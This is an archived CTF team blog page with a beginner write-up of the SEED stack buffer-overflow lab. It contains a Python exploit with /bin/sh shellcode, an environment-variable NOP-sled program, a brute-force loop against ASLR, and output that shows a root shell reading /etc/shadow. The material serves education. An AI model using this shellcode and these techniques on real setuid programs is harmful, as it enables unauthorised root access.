<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) & !(IE 8)]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<title>Writeup for beginners &#8211; BoF Vulnerability Lab (Syracuse University) | BabyPhD CTF Team</title>
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="https://babyphd.net/xmlrpc.php">
	<!--[if lt IE 9]>
	<script src="https://babyphd.net/wp-content/themes/twentythirteen/js/html5.js"></script>
	<![endif]-->
	<script type='text/javascript'>function ctSetCookie(c_name, value, def_value){document.cookie = c_name + '=' + escape(value) + '; path=/';}ctSetCookie('ct_checkjs', '1181016728', '0');</script><link rel='dns-prefetch' href='https://s0.wp.com/' />
<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Feed" href="../../../../feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Comments Feed" href="../../../../comments/feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Writeup for beginners - BoF Vulnerability Lab (Syracuse University) Comments Feed" href="feed/index.html" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/babyphd.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='../../../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.2.2.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='../../../../wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css%3Fver=3.1.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-style-css'  href='../../../../wp-content/themes/twentythirteen/style.css%3Fver=2013-07-18.css' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentythirteen-ie-css'  href='https://babyphd.net/wp-content/themes/twentythirteen/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='social-logos-css'  href='../../../../wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css%3Fver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='../../../../wp-content/plugins/jetpack/css/jetpack.css%3Fver=7.5.2.css' type='text/css' media='all' />
<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery.js%3Fver=1.12.4-wp'></script>
<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery-migrate.min.js%3Fver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js%3Fver=20190204'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctPublic = {"_ajax_nonce":"a204603c59","_ajax_url":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/cleantalk-spam-protect/js/apbct-public.min.js%3Fver=5.122'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctNocache = {"ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","info_flag":"","set_cookies_flag":"","blog_home":"https:\/\/babyphd.net\/"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/cleantalk-spam-protect/js/cleantalk_nocache.min.js%3Fver=5.122'></script>
<link rel='https://api.w.org/' href='../../../../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../../xmlrpc.php%3Frsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../../../wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Basic concepts of Chinese Remainder Theorem with respect of RSA/AES' href='../../11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/index.html' />
<link rel='next' title='Unlink technique' href='../../../04/07/unlink-technique/index.html' />
<meta name="generator" content="WordPress 5.2.2" />
<link rel="canonical" href="index.html" />
<link rel='shortlink' href='https://wp.me/p72HMd-7Q' />
<link rel="alternate" type="application/json+oembed" href="../../../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fbabyphd.net%252F2016%252F03%252F12%252Fwriteup-for-beginners-bof-vulnerability-lab-syracuse-university%252F" />
<link rel="alternate" type="text/xml+oembed" href="../../../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fbabyphd.net%252F2016%252F03%252F12%252Fwriteup-for-beginners-bof-vulnerability-lab-syracuse-university%252F&amp;format=xml" />

<link rel='dns-prefetch' href='https://v0.wordpress.com/'/>
<link rel='dns-prefetch' href='https://i0.wp.com/'/>
<link rel='dns-prefetch' href='https://i1.wp.com/'/>
<link rel='dns-prefetch' href='https://i2.wp.com/'/>
<style type='text/css'>img#wpstats{display:none}</style>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
			<style type="text/css" id="twentythirteen-header-css">
			.site-header {
			background: url(../../../../wp-content/themes/twentythirteen/images/headers/star.png) no-repeat scroll top;
			background-size: 1600px auto;
		}
		@media (max-width: 767px) {
			.site-header {
				background-size: 768px auto;
			}
		}
		@media (max-width: 359px) {
			.site-header {
				background-size: 360px auto;
			}
		}
		</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Writeup for beginners - BoF Vulnerability Lab (Syracuse University)" />
<meta property="og:url" content="https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/" />
<meta property="og:description" content="Visitors sometimes feel bored with our web blog because of too many boring stuffs which not often appear in their casual work/study. I just want to post such a simple tutorial for beginners and if …" />
<meta property="article:published_time" content="2016-03-12T16:02:46+00:00" />
<meta property="article:modified_time" content="2016-03-13T22:44:58+00:00" />
<meta property="og:site_name" content="BabyPhD CTF Team" />
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Writeup for beginners - BoF Vulnerability Lab (Syracuse University)" />
<meta name="twitter:card" content="summary" />

<!-- End Jetpack Open Graph Tags -->
			<style type="text/css" id="wp-custom-css">
				code {
    padding: 2px 4px;
    margin: 0;
    border-radius: 2px;
    color: #222;
    background: #f2f4f5;
}			</style>
		</head>

<body class="post-template-default single single-post postid-486 single-format-standard sidebar">
	<div id="page" class="hfeed site">
		<header id="masthead" class="site-header" role="banner">
			<a class="home-link" href="../../../../index.html" title="BabyPhD CTF Team" rel="home">
				<h1 class="site-title">BabyPhD CTF Team</h1>
				<h2 class="site-description">Nói chung đây là một khái niệm vô cùng trừu tượng</h2>
			</a>

			<div id="navbar" class="navbar">
				<nav id="site-navigation" class="navigation main-navigation" role="navigation">
					<button class="menu-toggle">Menu</button>
					<a class="screen-reader-text skip-link" href="index.html#content" title="Skip to content">Skip to content</a>
					<div id="primary-menu" class="nav-menu"><ul>
<li class="page_item page-item-2"><a href="../../../../ctf-wtf/index.html">CTF</a></li>
</ul></div>
					<form role="search" method="get" class="search-form" action="../../../../index.html">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form>				</nav><!-- #site-navigation -->
			</div><!-- #navbar -->
		</header><!-- #masthead -->

		<div id="main" class="site-main">

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">

						
				
<article id="post-486" class="post-486 post type-post status-publish format-standard hentry category-uncategorized">
	<header class="entry-header">
		
				<h1 class="entry-title">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</h1>
		
		<div class="entry-meta">
			<span class="date"><a href="index.html" title="Permalink to Writeup for beginners - BoF Vulnerability Lab (Syracuse University)" rel="bookmark"><time class="entry-date" datetime="2016-03-12T16:02:46+00:00">March 12, 2016</time></a></span><span class="categories-links"><a href="../../../../category/uncategorized/index.html" rel="category tag">Uncategorized</a></span><span class="author vcard"><a class="url fn n" href="../../../../author/chuymichxinhdep/index.html" title="View all posts by chuymichxinhdep" rel="author">chuymichxinhdep</a></span>					</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

		<div class="entry-content">
		<p>Visitors sometimes feel bored with our web blog because of too many boring stuffs which not often appear in their casual work/study. I just want to post such a simple tutorial for beginners and if you are experienced in CTF's pwn then just skip it. Enjoy!</p>
<p><span id="more-486"></span></p>
<p>Reference: <a href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Buffer_Overflow/" target="_blank">BoF Vulnerability Lab (Syracuse University)</a></p>
<p><strong>Return to Shellcode</strong><br />
===================</p>
<p>The program stack.c has 2 functions: main() and bof() which has a buffer overflow vulnerability. Main function reads an input from a file called “badfile”, and then passes this value to function bof(). The original input can have a maximum length of 517 bytes, but the buffer in bof() has only 24 bytes long. Buffer overflow will occur because strcpy() does not check boundaries. Since this program is super-uid executable, if a normal user can exploit this buffer overflow vulnerability, any user might be able to execute shellcode under root privilege. It should be considered that the program gets its input from a file called ’badfile’, system environment variables and argument variables. They are under our control hence there are many approaches to spawn a root shell.<br />
Some conditions in the first task are described as following:</p>
<p>- The vulnerable program was compiled with chmod 4755 under<br />
root permission.</p>
<p>- It was built with options: execstack and -fno-stack-protector to<br />
turn off the non-executable stack and StackGuard protections.</p>
<p>- ASLR was turned off.</p>
<p>Inside the function bof(), the buffer variable is defined as an array of 24 chars. It can be easily overflowed with a longer string str which reads from “badfile”. However, the defined variable on stack depends along both operating system and the compiler. Result of GDB will help us to make sure the size of stack certainly:<br />
(gdb) disas bof<br />
Dump of assembler code for function bof:</p>
<pre class="lang:default decode:true ">0x08048484 &lt;+0&gt;: push ebp
0x08048485 &lt;+1&gt;: mov ebp,esp
0x08048487 &lt;+3&gt;: sub esp,0x38
0x0804848a &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]
0x0804848d &lt;+9&gt;: mov DWORD PTR [esp+0x4],eax
0x08048491 &lt;+13&gt;: lea eax,[ebp-0x20]
0x08048494 &lt;+16&gt;: mov DWORD PTR [esp],eax
0x08048497 &lt;+19&gt;: call 0x8048380 &lt;strcpy@plt&gt;
0x0804849c &lt;+24&gt;: mov eax,0x1
0x080484a1 &lt;+29&gt;: leave
0x080484a2 &lt;+30&gt;: ret</pre>
<p>&nbsp;</p>
<p>The buffer variable’s size is 32 bytes according to line 13 and also 32 bytes to reach Stack pointer and plus 4 bytes to reach saved Based pointer. In order to spawn a shell, execve /bin/sh shellcode was generated and placed into badfile after some NOPs (\\x90) . The return address is unknown and also it is a difference between GDB environment and the real-time one. It can be revealed by using:</p>
<p>- Live program tracing (strace/ltrace).</p>
<p>- Modifying the source code.</p>
<p>- Brute-forcing the return address.</p>
<p>- GDB debugging with dumped core (segmentation fault).</p>
<p>We chose the first solution because the second one is unrealistic, the third and fourth one would take much effort.</p>
<pre class="lang:default decode:true">seed@ubuntu:~/Desktop$ ltrace ./stack
__libc_start_main(0x80484a3, 1, 0xbffff434, 0x8048520, 0x8048590 &lt;unfinished ...&gt;
fopen("badfile", "r") = 0x804b008
fread(0xbffff187, 1, 517, 0x804b008) = 40
----snippet----</pre>
<p>The buffer variable which reads from badfile has address: 0xbffff187. In sum, we construct a payload combined from NOPs, shellcode, ESP (or a random 4bytes), return address 0xbffff187 in little-endian format to an exploitation program called exploit.py which writes the payload to “badfile”:</p>
<p>&nbsp;</p>
<pre class="lang:default decode:true ">import struct
shellcode= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
f = open('badfile','w')
ret = struct.pack('&lt;I', 0xbffff187)
f.write("\x90"*(0x20-len(shellcode))+shellcode+"DEAD"+ret)</pre>
<p>&nbsp;</p>
<p>We launch the attack by running the vulnerable program and spawn a root shell successfully.</p>
<pre class="lang:default decode:true ">[12/01/2015 15:25] seed@ubuntu:~/Desktop$ python exploit.py
[12/01/2015 15:25] seed@ubuntu:~/Desktop$ ./stack
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark),1000(seed)
# cat /etc/shadow
root:$6$012BPz.K$fbPkT6H6Db4/B8cLWbQI1cFjn0R25yqtqrSrFeWfCgybQWWnwR4ks/.rjqyM7Xwh/pDyc5U1BWOzkWh7T9ZGu.:15933:0:99999:7:::</pre>
<p>&nbsp;</p>
<p><strong>Address Randomization</strong><br />
=====================</p>
<p>There are some conditions in the second task as following:</p>
<p>- The vulnerable program was compiled with chmod 4755 under root permission.</p>
<p>- It was built with options: execstack and -fno-stack-protector to turn off the non-executable stack and StackGuard protections.</p>
<p>- ASLR was turned on.</p>
<p>The above exploitation program was not working and resulted “Segmentation fault (core dumped)” because ASLR was turned on that<br />
assures the program addresses are changed randomly for each execution. There are some techniques to bypass this prevention:</p>
<p>- Brute-forcing or running the exploitation program many times</p>
<p>- Return-oriented programming (or using a branch of this technique: ret2libc)</p>
<p>However the “badfile” input can have a maximum length of only 517 bytes but the observed buffer could be any addresses ranged from 0xbf000000 to 0xbfffffff. It makes the attack difficult to jump into the shellcode exactly even when we fill the whole “str” variable upto 517 bytes with a larger number of NOPs and shellcode placed behind the return address. In order to increase the probability of success, we can utilize an environment variable to hold a larger payload. The following code loads ten thousand bytes of NOPs and shellcode into environment variable EGG.</p>
<pre class="lang:default decode:true ">/* eggcode.c */
#include &lt;unistd.h&gt;
#define NOP 0x90
char shellcode[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80";
int main(void)
{
char shell[10000];
puts("Eggshell loaded into environment.\n");
memset(shell,NOP,10000); /* fill-up the buffer with NOP */
/* fill-up the shellcode on the second half to the end of buffer */
memcpy(&amp;shell[10000-strlen(shellcode)],shellcode,strlen(shellcode));
/* set the environment variable to */
/* EGG and shell as its value, rewrite if needed */
setenv("EGG", shell, 1);
/* modify the variable */
putenv(shell);
/* invoke the bash */
system("bash");
return 0;
}</pre>
<p>&nbsp;</p>
<p>We simply executed the program above then attempted ./stack in the following loop and spawn a root shell in just a minute.</p>
<pre class="lang:default decode:true ">$ sh -c "while [ 1 ]; do ./stack; done;"
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
---snippet---
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark),1000(seed)</pre>
<p>&nbsp;</p>
<p>Stack Guard<br />
<strong>===========</strong></p>
<p>The following options describe the conditions of third task:</p>
<p>- The vulnerable program was compiled with chmod 4755 under root permission.</p>
<p>- It was built without the option -fno-stack-protector to turn on the Stack Guard.</p>
<p>- ASLR was turned off.</p>
<p>For this task, we executed the exploitation program again and observed an error message:</p>
<pre class="lang:default decode:true ">seed@ubuntu:~/Desktop$ ./stack
*** stack smashing detected ***: ./stack terminated
Segmentation fault (core dumped)</pre>
<p>&nbsp;</p>
<p>The reason of this error is a protection mechanism used by compiler to detect buffer overflow occurs. It adds random protection variables (called canaries or stack cookies) to the stack. We can get some information about the point of overflow insight by running the program in GDB. For instance, the disassembly of bof() function is different from the previous one:</p>
<pre class="lang:default decode:true ">(gdb) disas bof
Dump of assembler code for function bof:
0x080484d4 &lt;+0&gt;: push ebp
0x080484d5 &lt;+1&gt;: mov ebp,esp
0x080484d7 &lt;+3&gt;: sub esp,0x48
0x080484da &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]
0x080484dd &lt;+9&gt;: mov DWORD PTR [ebp-0x2c],eax
0x080484e0 &lt;+12&gt;: mov eax,gs:0x14
0x080484e6 &lt;+18&gt;: mov DWORD PTR [ebp-0xc],eax
0x080484e9 &lt;+21&gt;: xor eax,eax
0x080484eb &lt;+23&gt;: mov eax,DWORD PTR [ebp-0x2c]
0x080484ee &lt;+26&gt;: mov DWORD PTR [esp+0x4],eax
0x080484f2 &lt;+30&gt;: lea eax,[ebp-0x24]
0x080484f5 &lt;+33&gt;: mov DWORD PTR [esp],eax
0x080484f8 &lt;+36&gt;: call 0x80483d0 &lt;strcpy@plt&gt;
0x080484fd &lt;+41&gt;: mov eax,0x1
0x08048502 &lt;+46&gt;: mov edx,DWORD PTR [ebp-0xc]
0x08048505 &lt;+49&gt;: xor edx,DWORD PTR gs:0x14
0x0804850c &lt;+56&gt;: je 0x8048513 &lt;bof+63&gt;
0x0804850e &lt;+58&gt;: call 0x80483b0 &lt;__stack_chk_fail@plt&gt;
0x08048513 &lt;+63&gt;: leave
0x08048514 &lt;+64&gt;: ret
End of assembler dump.</pre>
<p>&nbsp;</p>
<p>The compiler firstly moves a random value to stack at address <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7794f0c456c0855443a03d4c63788683.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, and compares these 2 values by using XOR in the end of this<br />
function. If the value in stack is modified then the program will jump to the function stackchkfail() which notifies an error message “stack smashing detected” eventually. This means if our program overwrites the whole stack and tries to illegally control the stack pointers will make it halted. There are some techniques to bypass the Stack Guard : leak the value of canaries or overwrite the entire stack all the way up to the arguments and environment vectors but the stack cookie check would not working properly. Moreover please take a look at this <a href="https://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf" target="_blank">paper</a>.</p>
<p>&nbsp;</p>
<p>-cmxd</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-486" class="share-twitter sd-button share-icon no-text" href="index.html%3Fshare=twitter.html" target="_blank" title="Click to share on Twitter"><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-486" class="share-facebook sd-button share-icon no-text" href="index.html%3Fshare=facebook.html" target="_blank" title="Click to share on Facebook"><span></span><span class="sharing-screen-reader-text">Click to share on Facebook (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>	</div><!-- .entry-content -->
	
	<footer class="entry-meta">
		
			</footer><!-- .entry-meta -->
</article><!-- #post -->
					<nav class="navigation post-navigation" role="navigation">
		<h1 class="screen-reader-text">Post navigation</h1>
		<div class="nav-links">

			<a href="../../11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/index.html" rel="prev"><span class="meta-nav">&larr;</span> Basic concepts of Chinese Remainder Theorem with respect of RSA/AES</a>			<a href="../../../04/07/unlink-technique/index.html" rel="next">Unlink technique <span class="meta-nav">&rarr;</span></a>
		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
					
<div id="comments" class="comments-area">

			<h2 class="comments-title">
			One thought on &ldquo;<span>Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</span>&rdquo;		</h2>

		<ol class="comment-list">
					<li id="comment-7218" class="comment even thread-even depth-1">
			<article id="div-comment-7218" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/61a4ede1d517ed9b58991a5c6f9abcdc?s=74&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/61a4ede1d517ed9b58991a5c6f9abcdc?s=148&#038;d=blank&#038;r=g 2x' class='avatar avatar-74 photo' height='74' width='74' />						<b class="fn">Tony</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="index.html#comment-7218">
							<time datetime="2016-11-25T01:43:02+00:00">
								November 25, 2016 at 1:43 am							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>In the first example, if you don't put the NOPs before the shellcode (for instance if you write the shellcode and then the NOPs) the exploit does not work. Can you explain why are the NOPs required in that place?</p>
				</div><!-- .comment-content -->

							</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
				<p class="no-comments">Comments are closed.</p>
		
	
	
</div><!-- #comments -->
			
		</div><!-- #content -->
	</div><!-- #primary -->

	<div id="tertiary" class="sidebar-container" role="complementary">
		<div class="sidebar-inner">
			<div class="widget-area">
						<aside id="recent-posts-6" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
											<li>
					<a href="../../../../2018/08/01/meepwn-ctf-2018-meepwn-contract/index.html">MEEPWN CTF 2018 - meepwn contract</a>
									</li>
											<li>
					<a href="../../../../2018/07/17/meepwn-ctf-2018-xss/index.html">MEEPWN CTF 2018 - XSS</a>
									</li>
											<li>
					<a href="../../../../2018/07/17/meepwn-ctf-2018-pycalx2/index.html">MEEPWN CTF 2018 - PyCalx2</a>
									</li>
											<li>
					<a href="../../../../2017/08/10/wtf-is-safefinderoperatormac-campaign/index.html">What is SafeFinder/OperatorMac campaign?</a>
									</li>
											<li>
					<a href="../../../../2017/07/27/meepwnctf-2017-injection/index.html">MeepwnCTF 2017 - injection</a>
									</li>
					</ul>
		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">justcallmedude</span> on <a href="../../../11/24/hackyou-ctf-su-2016/index.html#comment-8120">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">zun</span> on <a href="../../../11/24/hackyou-ctf-su-2016/index.html#comment-7474">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">Tony</span> on <a href="index.html#comment-7218">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</a></li><li class="recentcomments"><span class="comment-author-link">john</span> on <a href="../../../09/11/whitehat-contest-11-pwn400/index.html#comment-7211">Whitehat Contest 12 - Pwn400</a></li><li class="recentcomments"><span class="comment-author-link"><a href='../../../../index.html' rel='external nofollow' class='url'>chuymichxinhdep</a></span> on <a href="../../../09/11/whitehat-contest-11-pwn400/index.html#comment-7210">Whitehat Contest 12 - Pwn400</a></li></ul></aside><aside id="archives-3" class="widget widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
				<li><a href='../../../../2018/08/index.html'>August 2018</a></li>
	<li><a href='../../../../2018/07/index.html'>July 2018</a></li>
	<li><a href='../../../../2017/08/index.html'>August 2017</a></li>
	<li><a href='../../../../2017/07/index.html'>July 2017</a></li>
	<li><a href='../../../../2017/05/index.html'>May 2017</a></li>
	<li><a href='../../../11/index.html'>November 2016</a></li>
	<li><a href='../../../09/index.html'>September 2016</a></li>
	<li><a href='../../../07/index.html'>July 2016</a></li>
	<li><a href='../../../04/index.html'>April 2016</a></li>
	<li><a href='../../index.html'>March 2016</a></li>
	<li><a href='../../../../2015/10/index.html'>October 2015</a></li>
	<li><a href='../../../../2015/09/index.html'>September 2015</a></li>
	<li><a href='../../../../2015/05/index.html'>May 2015</a></li>
	<li><a href='../../../../2015/04/index.html'>April 2015</a></li>
	<li><a href='../../../../2015/02/index.html'>February 2015</a></li>
	<li><a href='../../../../2015/01/index.html'>January 2015</a></li>
		</ul>
			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
				<li class="cat-item cat-item-32"><a href="../../../../category/chuymich/index.html">chuymich</a>
</li>
	<li class="cat-item cat-item-18"><a href="../../../../category/crypto/index.html">crypto</a>
</li>
	<li class="cat-item cat-item-31"><a href="../../../../category/forensic/index.html">forensic</a>
</li>
	<li class="cat-item cat-item-15"><a href="../../../../category/misc/index.html">misc</a>
</li>
	<li class="cat-item cat-item-25"><a href="../../../../category/pwn/index.html">pwn</a>
</li>
	<li class="cat-item cat-item-4"><a href="../../../../category/re/index.html">re</a>
</li>
	<li class="cat-item cat-item-38"><a href="../../../../category/research/index.html">research</a>
</li>
	<li class="cat-item cat-item-47"><a href="../../../../category/smartcontract/index.html">smartcontract</a>
</li>
	<li class="cat-item cat-item-1"><a href="../../../../category/uncategorized/index.html">Uncategorized</a>
</li>
	<li class="cat-item cat-item-9"><a href="../../../../category/vietnamese/index.html">vietnamese</a>
</li>
	<li class="cat-item cat-item-10"><a href="../../../../category/web/index.html">web</a>
</li>
	<li class="cat-item cat-item-30"><a href="../../../../category/whitehat/index.html">whitehat</a>
</li>
		</ul>
			</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="../../../../tag/2015/index.html" class="tag-cloud-link tag-link-36 tag-link-position-1" style="font-size: 8pt;" aria-label="2015 (1 item)">2015</a>
<a href="../../../../tag/babyphd/index.html" class="tag-cloud-link tag-link-35 tag-link-position-2" style="font-size: 8pt;" aria-label="babyphd (1 item)">babyphd</a>
<a href="../../../../tag/backdoorctf/index.html" class="tag-cloud-link tag-link-33 tag-link-position-3" style="font-size: 8pt;" aria-label="backdoorCTF (1 item)">backdoorCTF</a>
<a href="../../../../tag/crypto/index.html" class="tag-cloud-link tag-link-14 tag-link-position-4" style="font-size: 22pt;" aria-label="crypto (3 items)">crypto</a>
<a href="../../../../tag/css/index.html" class="tag-cloud-link tag-link-42 tag-link-position-5" style="font-size: 8pt;" aria-label="css (1 item)">css</a>
<a href="../../../../tag/gaylord/index.html" class="tag-cloud-link tag-link-34 tag-link-position-6" style="font-size: 8pt;" aria-label="gaylord (1 item)">gaylord</a>
<a href="../../../../tag/heap/index.html" class="tag-cloud-link tag-link-37 tag-link-position-7" style="font-size: 8pt;" aria-label="heap (1 item)">heap</a>
<a href="../../../../tag/list-linked/index.html" class="tag-cloud-link tag-link-28 tag-link-position-8" style="font-size: 8pt;" aria-label="list-linked (1 item)">list-linked</a>
<a href="../../../../tag/malware/index.html" class="tag-cloud-link tag-link-43 tag-link-position-9" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
<a href="../../../../tag/mughthesec/index.html" class="tag-cloud-link tag-link-45 tag-link-position-10" style="font-size: 8pt;" aria-label="Mughthesec (1 item)">Mughthesec</a>
<a href="../../../../tag/operatormac/index.html" class="tag-cloud-link tag-link-44 tag-link-position-11" style="font-size: 8pt;" aria-label="OperatorMac (1 item)">OperatorMac</a>
